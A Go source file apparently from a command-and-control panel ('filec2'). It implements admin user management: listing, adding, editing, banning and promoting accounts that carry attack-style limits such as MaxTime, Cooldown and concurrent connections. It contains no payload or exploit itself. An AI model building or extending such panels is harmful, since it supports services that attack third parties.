package commands

import (
	"fmt"
	"log"
	"strconv"
	"strings"
	"time"

	"filec2/Handlers/sessions"
	"filec2/db"

	"github.com/alexeyco/simpletable"
)

func init() {
	Register(&Command{
		Name:  "users",
		Admin: true,

		Execute: func(session *sessions.Session, cmd []string) error {

			if len(cmd) < 2 {
				return usersList(session, cmd)
			}

			switch cmd[1] {
			case "add", "create", "new":
				return usersAdd(session, cmd)
			case "remove", "del", "delete", "terminate":
				return usersRemove(session, cmd)
			case "edit":
				return usersEdit(session, cmd)
			case "admin=true", "admin":

				if len(cmd) < 3 {
					_, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8musers admin=true <username>")
					return err
				}

				user, err := db.GetUser(cmd[2])
				if err != nil {
					log.Println("commands/users.Admin:", err)
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser could not be fetched."); err != nil {
						return err
					}
					return nil
				}

				if user == nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser does not exist."); err != nil {
						return err
					}
					return nil
				}

				user.Admin = true

				if err := db.EditUser(user); err != nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mFailed to promote user: " + err.Error()); err != nil {
						return err
					}
				}

				if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser prompted"); err != nil {
					return err
				}

				break
			case "admin=false", "standard":

				if len(cmd) < 3 {
					_, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8musers admin=false <username>")
					return err
				}

				user, err := db.GetUser(cmd[2])
				if err != nil {
					log.Println("commands/users.Admin:", err)
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser could not be fetched."); err != nil {
						return err
					}
					return nil
				}

				if user == nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser does not exist."); err != nil {
						return err
					}
					return nil
				}

				user.Admin = false

				if err := db.EditUser(user); err != nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mFailed to demote user: " + err.Error()); err != nil {
						return err
					}
				}

				if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser demoted"); err != nil {
					return err
				}

				break
			case "ban":

				if len(cmd) < 3 {
					_, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8musers ban <username>")
					return err
				}

				user, err := db.GetUser(cmd[2])
				if err != nil {
					log.Println("commands/users.Admin:", err)
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser could not be fetched."); err != nil {
						return err
					}
					return nil
				}

				if user == nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser does not exist."); err != nil {
						return err
					}
					return nil
				}

				user.Banned = true

				if err := db.EditUser(user); err != nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mFailed to ban user: " + err.Error()); err != nil {
						return err
					}
				}

				if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser banned"); err != nil {
					return err
				}

				break
			case "unban":

				if len(cmd) < 3 {
					_, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8musers unban <username>")
					return err
				}

				user, err := db.GetUser(cmd[2])
				if err != nil {
					log.Println("commands/users.Admin:", err)
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser could not be fetched."); err != nil {
						return err
					}
					return nil
				}

				if user == nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser does not exist."); err != nil {
						return err
					}
					return nil
				}

				user.Banned = false

				if err := db.EditUser(user); err != nil {
					if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mFailed to unban user: " + err.Error()); err != nil {
						return err
					}
				}

				if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser unbanned"); err != nil {
					return err
				}

				break
			default:
				if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUnknown subcommand."); err != nil {
					return err
				}
				break
			}

			return nil
		},
	})
}

func usersRemove(session *sessions.Session, cmd []string) error {

	if len(cmd) < 3 {
		_, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8musers del <username>")
		return err
	}

	user, err := db.GetUser(cmd[2])
	if err != nil {
		log.Println("commands/users.Remove:", err)
		if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser could not be fetched."); err != nil {
			return err
		}
		return nil
	}

	if user == nil {
		if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser does not exist."); err != nil {
			return err
		}
		return nil
	}

	if err := user.Delete(); err != nil {
		if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mError deleting user: ", err); err != nil {
			return err
		}
		return nil
	}

	if _, err := session.Println("\x1b[0m\x1b[38;2;14;161;129m                               ╠═\x1b[38;2;252;8;8mUser removed."); err != nil {
		return err
	}

	return nil
}

func usersList(session *sessions.Session, cmd []string) error {

	table := simpletable.New()
	table.Header = &simpletable.Header{
		Cells: []*simpletable.Cell{
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205m#\x1b[0m"},
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205mUsername\x1b[0m"},
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205mAdmin\x1b[0m"},
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205mBanned\x1b[0m"},
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205mTime\x1b[0m"},
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205mConns\x1b[0m"},
			{Align: simpletable.AlignCenter, Text: "\x1b[38;5;205mCooldown\x1b[0m"},
		},
	}

	users, err := db.GetUsers()
	if err != nil {
		return err
	}

	for i, user := range users {
		r := []*simpletable.Cell{
			{Align: simpletable.AlignLeft, Text: fmt.Sprint(i + 1)},
			{Align: simpletable.AlignLeft, Text: user.Username},
			{Align: simpletable.AlignLeft, Text: formatBool(user.Admin)},
			{Align: simpletable.AlignLeft, Text: formatBool(user.Banned)},
			{Align: simpletable.AlignLeft, Text: fmt.Sprint(user.MaxTime)},
			{Align: simpletable.AlignLeft, Text: fmt.Sprint(user.Conns)},
			{Align: simpletable.AlignLeft, Text: fmt.Sprint(user.Cooldown)},
		}

		table.Body.Cells = append(table.Body.Cells, r)
	}

	//table.SetStyle(simpletable.StyleCompactClassic)
	//_, err = session.Println(strings.Replace("    "+table.String(), "\n", "\r\n    ", -1), "\r\n")
	//return err
	table.SetStyle(simpletable.StyleCompactLite)
	_, err = session.Println(strings.Replace("    "+table.String(), "\n", "\r\n    ", -1), "\r\n")
	return err
}

func formatBool(input bool) string {

	if input == false {
		return "\x1b[31mfalse\x1b[0m"
	}

	return "\x1b[32mtrue\x1b[0m"
}

func usersAdd(session *sessions.Session, cmd []string) error {

	username := ""
	var err error

	if _, err := session.Write([]byte("\x1b[0m    Username> \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    Password> \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    MaxTime>  \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    Cooldown> \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}
	if _, err := session.Write([]byte("\x1b[0m    Expiry> \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    Conns>    \x1b[47m\x1b[30m                     \x1b[0m\x1b[10A")); err != nil {
		return err
	}

	username, err = session.ReadCustom("\x1b[0m    Username> \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}

	if len(username) < 3 {
		if _, err := session.Println("\x1b[0m    Username must be at least 3 characters.\n\r\n\n\r\n\n\r\n\n\r"); err != nil {
			return err
		}
		return nil
	}

	if strings.Contains(username, " ") || strings.Contains(username, "\t") {
		if _, err := session.Println("\x1b[0m    Username must can't have spaces.\n\r\n\n\r\n\n\r\n\n\r"); err != nil {
			return err
		}
		return nil
	}

	if user, _ := db.GetUser(username); user != nil {
		if _, err := session.Println("\x1b[0m    Username is already taken.\n\r\n\n\r\n\n\r\n\n\r"); err != nil {
			return err
		}
		return nil
	}

	password, err := session.ReadCustom("\r\n\x1b[0m    Password> \x1b[47m\x1b[30m", true, 20)
	if err != nil {
		return err
	}

	maxTimeInput, err := session.ReadCustom("\r\n\x1b[0m    MaxTime>  \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}

	maxTime, err := strconv.Atoi(maxTimeInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n\n\r\n\r"); err != nil {
			return err
		}
		return nil
	}

	cooldownInput, err := session.ReadCustom("\r\n\x1b[0m    Cooldown> \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}
	cooldown, err := strconv.Atoi(cooldownInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n\n\r\n\r"); err != nil {
			return err
		}
		return nil
	}
	expiryInput, err := session.ReadCustom("\r\n\x1b[0m    Expiry> \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}
	expiry, err := strconv.Atoi(expiryInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n\n\r\n\r"); err != nil {
			return err
		}
		return nil
	}

	concurrentsInput, err := session.ReadCustom("\r\n\x1b[0m    Conns>    \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}

	conns, err := strconv.Atoi(concurrentsInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n"); err != nil {
			return err
		}
		return nil
	}

	if err := db.NewUser(&db.User{
		Username:    username,
		Password:    db.HashPassword(password),
		Admin:       false,
		Banned:      false,
		Cooldown:    cooldown,
		MaxTime:     maxTime,
		Conns:       conns,
		Expiry:      time.Now().Add((time.Hour * 24) * time.Duration(expiry)).Unix(),
		MaxSessions: 1,
	}); err != nil {
		if _, err := session.Println("\r\n\x1b[0m    Failed to create user: " + err.Error()); err != nil {
			return err
		}
	}

	if _, err := session.Println("\r\n\x1b[0m    User created"); err != nil {
		return err
	}

	return nil
}

func usersEdit(session *sessions.Session, cmd []string) error {

	if len(cmd) < 3 {
		_, err := session.Println("    users edit <username>")
		return err
	}

	user, err := db.GetUser(cmd[2])
	if err != nil {
		return err
	}

	if user == nil {
		_, err := session.Println("    User does not exist")
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    Username> \x1b[47m\x1b[30m" + fmt.Sprintf("%-20s", user.Username) + " \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    MaxTime>  \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    Cooldown> \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}
	if _, err := session.Write([]byte("\x1b[0m    Expiry> \x1b[47m\x1b[30m                     \x1b[0m\r\n\r\n")); err != nil {
		return err
	}

	if _, err := session.Write([]byte("\x1b[0m    Conns>    \x1b[47m\x1b[30m                     \x1b[0m\x1b[5A")); err != nil {
		return err
	}

	maxTimeInput, err := session.ReadCustom("\r\n\x1b[0m    MaxTime>  \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}

	maxTime, err := strconv.Atoi(maxTimeInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n\n\r"); err != nil {
			return err
		}
		return nil
	}

	cooldownInput, err := session.ReadCustom("\r\n\x1b[0m    Cooldown> \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}
	cooldown, err := strconv.Atoi(cooldownInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n\n\r"); err != nil {
			return err
		}
		return nil
	}
	expiryInput, err := session.ReadCustom("\r\n\x1b[0m    Expiry> \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}
	expiry, err := strconv.Atoi(expiryInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n\n\r\n\r"); err != nil {
			return err
		}
		return nil
	}

	concurrentsInput, err := session.ReadCustom("\r\n\x1b[0m    Conns>    \x1b[47m\x1b[30m", false, 20)
	if err != nil {
		return err
	}

	conns, err := strconv.Atoi(concurrentsInput)
	if err != nil {
		if _, err := session.Println("\x1b[0m    Invalid integer.\n\r\n"); err != nil {
			return err
		}
		return nil
	}

	if err := db.EditUser(&db.User{
		ID:          user.ID,
		Username:    user.Username,
		Password:    user.Password,
		Admin:       user.Admin,
		Banned:      user.Banned,
		Cooldown:    cooldown,
		MaxTime:     maxTime,
		Conns:       conns,
		Expiry:      time.Now().Add((time.Hour * 24) * time.Duration(expiry)).Unix(),
		MaxSessions: 1,
	}); err != nil {
		if _, err := session.Println("\r\n\x1b[0m    Failed to edit user: " + err.Error()); err != nil {
			return err
		}
	}

	if _, err := session.Println("\r\n\x1b[0m    User updated"); err != nil {
		return err
	}

	return nil
}
